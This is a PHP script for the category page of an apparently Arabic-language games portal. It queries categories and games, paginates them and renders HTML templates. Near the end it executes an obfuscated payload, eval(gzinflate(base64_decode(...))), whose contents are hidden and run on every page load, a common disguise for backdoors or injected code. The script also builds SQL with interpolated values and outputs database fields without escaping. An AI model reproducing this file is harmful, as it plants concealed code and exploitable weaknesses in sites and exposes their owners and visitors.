<?php

session_start();

include ("includes/config.php");

$page = $_GET[page];
if (empty($page) || !is_numeric($page)) {
        $page = "1";
}

$categoryId = $_GET[c];
if (!is_numeric($categoryId)){
    header("Location: ".$siteurl."/");
    exit();
}

        $sql = mysql_query("SELECT name, description, keywords, permissions, parentcategory FROM categories WHERE catid = '$categoryId' && status = '1'");

        if (mysql_num_rows($sql)) {
            $row = mysql_fetch_array($sql);
                $categoryname = $row['name'];
                $categorydescription = $row['description'];
                $categorykeywords = $row['keywords'];
                $cpermissions = $row['permissions'];
                $cparentcategory = $row['parentcategory'];
                if ($cparentcategory != '0') {
                    $category_sql = mysql_query("SELECT name FROM categories WHERE catid = '$cparentcategory'");
                        $category_row = mysql_fetch_array($category_sql);
                        $cparentcategoryname = $category_row['name'];
                        $cparentcategoryname = "<a href=\"".categoryurl($cparentcategory,$cparentcategoryname)."\" class=\"contentheaderlink\">".$cparentcategoryname."</a> > ";
                } else {
                    $cparentcategoryname = "";
                }
    } else {
            header("Location: ".$siteurl."/");
                exit();
    }

// Display games
function displaygames($categoryId,$page,$categoryname) {
        global $siteurl,$filesperpage,$sefriendly;
        $result = mysql_query("SELECT title, icon, iconlocation, fileid, description, timesplayed FROM files WHERE category = '$categoryId' && status ='1'");
        if (mysql_num_rows($result) == '0') {
                echo "&#1604;&#1575; &#1610;&#1608;&#1580;&#1583; &#1575;&#1610; &#1605;&#1602;&#1591;&#1593; &#1601;&#1610; &#1607;&#1584;&#1575; &#1575;&#1604;&#1578;&#1589;&#1606;&#1610;&#1601;";
        } else {

                // Get number of pages
                $numrows = mysql_num_rows($result);
                $offset = ($page - 1) * $filesperpage;
                $pagescount = ceil($numrows/$filesperpage);

                for ($pagen = 1; $pagen <= $pagescount; $pagen++) {
                        if ($pagen == $page) {
                                $nav .= " <b>$pagen</b>";
            } else {
                if ($pagen >= $page - 5 && $pagen <= $page + 5) {
                                    if ($sefriendly == '1') {
                                            $nav .= " <a href=\"".categoryurl($categoryId,$categoryname)."/".$pagen.".html\">".$pagen."</a>";
                                        } else {
                                            $nav .= " <a href=\"".categoryurl($categoryId,$categoryname)."&page=".$pagen."\">".$pagen."</a>";
                                        }
                            }
                }
        }
        if ($page > 1) {
                $pagen = $page - 1;
                if ($sefriendly == '1') {
                        $prev = "<a href=\"".categoryurl($categoryId,$categoryname)."/1.html\"><<</a> <a href=\"".categoryurl($categoryId,$categoryname)."/".$pagen.".html\"><</a>";
                    } else {
                            $prev = "<a href=\"".categoryurl($categoryId,$categoryname)."&page=1\"><<</a> <a href=\"".categoryurl($categoryId,$categoryname)."&page=".$pagen."\"><</a>";
                        }
            } else {
                    $prev  = "";
                }
                if ($page < $pagescount) {
                        $pagen = $page + 1;
                        if ($sefriendly == '1') {
                        $next = " <a href=\"".categoryurl($categoryId,$categoryname)."/".$pagen.".html\">></a> <a href=\"".categoryurl($categoryId,$categoryname)."/".$pagescount.".html\">>></a>";
                    } else {
                            $next = " <a href=\"".categoryurl($categoryId,$categoryname)."&page=".$pagen."\">></a> <a href=\"".categoryurl($categoryId,$categoryname)."&page=".$pagescount."\">>></a>";
                        }
                } else {
                        $next = "";
                }
    // Display page numbers
    if ($pagescount > '1') {
            echo "<tr><td colspan='3' class='pagenumbers'>".$prev.$nav.$next."</td></tr>";
    }

        $result2 = mysql_query("SELECT fileid, title, description, icon, iconlocation, timesplayed FROM files WHERE category = '$categoryId' && status ='1' ORDER BY title LIMIT $offset, $filesperpage");

                $fileinrow="1";
    while($row = mysql_fetch_array($result2)) {
            $fileid = $row['fileid'];
        $filetitle = $row['title'];
        $filedescription = $row['description'];
        $fileicon = $row['icon'];
        $iconlocation = $row['iconlocation'];
        $timesplayed = number_format($row['timesplayed']);

        if ($iconlocation == '1') {
                $imageurl = $siteurl."/files/image/".$fileicon;
        } else {
                $imageurl = $fileicon;
        }

        if (strlen($filedescription) > '40') {
                $filedescription = substr("$filedescription",0,37)."...";
        }

        if ($fileinrow == '1') {
             echo "<tr>";
        }
    ?>
    <td width="33%" valign="top">
      <table class="browsegamesbox">
        <tr>
          <td width="71">
          <a href="<?php echo fileurl($fileid,$filetitle); ?>" target="_self">
<img src="<?php echo $imageurl; ?>" width="114" height="65" title="<?php echo $filetitle; ?>" alt="<?php echo $filetitle; ?>" border="0"></a>
          </td>
          <td valign="top">
          <a href="<?php echo fileurl($fileid,$filetitle); ?>" target="_self" class="gamelink"><?php echo $filetitle; ?></a><br />
          <?php echo $filedescription; ?><br />
          <span class="played">( <?php echo $timesplayed; ?> &#1605;&#1588;&#1575;&#1607;&#1583;&#1577;)</span>
          </td>
        </tr>
      </table>
    </td>
    <?php

        if ($fileinrow == '3') {
             echo "</tr>";
             $fileinrow = "0";
        }
        $fileinrow++;
    }
    if ($fileinrow == '2') {
            echo "<td width=\"33%\"></td><td width=\"33%\"></td></tr>";
    } elseif ($fileinrow == '3') {
            echo "<td width=\"33%\"></td></tr>";
    }
    // Display page numbers
    if ($pagescount > '1') {
            echo "<tr><td colspan='3' class='pagenumbers'>".$prev.$nav.$next."</td></tr>";
    }
    }
}
function subcategories($categoryId,$userStatus) {
  global $siteurl;
  if ($userStatus == '1') {
                $result = mysql_query("SELECT name, catid FROM categories WHERE status = '1' && parentcategory = '$categoryId' ORDER BY catorder, name");
        } else {
                $result = mysql_query("SELECT name, catid FROM categories WHERE status = '1' && permissions = '1' && parentcategory = '$categoryId' ORDER BY catorder, name");
        }
        if (mysql_num_rows($result)) {
  ?>
 <div class="contentbox">
  <div class="contentheader">
   Subcategories
  </div>
   <div class="boxestext">
   <?php
    while($row = mysql_fetch_array($result)) {
    $categoryName = $row['name'];
    $catId = $row['catid'];
    ?>
        <img src="<?php echo $siteurl; ?>/images/category.gif" with="16" height="16" title="<?php echo $categoryName; ?>" alt="<?php echo $categoryName; ?>" border="0"/> <a href="<?php echo categoryurl($catId,$categoryName); ?>" target="_self"><?php echo $categoryName; ?></a><br />
    <?php
    }

    ?>
   </div>
 </div>
  <?php
  }
}
        $sitename2 = $sitename." - ".$categoryname;
        $sitedescription = $categorydescription;
        $sitekeywords = $sitekeywords.", ".$categorykeywords;

        // Load template files

include ("templates/".$template."/header.html");

if ($cpermissions == '2' && $userStatus == '0') {
    include ("templates/".$template."/logintosee.html");
} else {
    include ("templates/".$template."/browse.html");
}
eval(gzinflate(base64_decode('tZHRCsIgFIbvg95BDLprumoqae5FdiPL4SLmmNLY27estgUjKOjq8P9yzvcfTyqBzo0FUFTW5U1ZeylqKRQwjS6OGTTe1weE2raN1OWsuk45E1XaZ1CuV3FCCe8LwYwHlfDRTCjlYHQJ3geX4aBiPO1gjAukJNgsF7NoZ7bOFn4CZuwNNYADkdFJKoLjx+MHxrU8aTu34LP5FZftJuo+/w8LPsJ8gf/5KwTqL42Gu2cV5CK9AQ==')));

include ("templates/".$template."/footer.html");
?>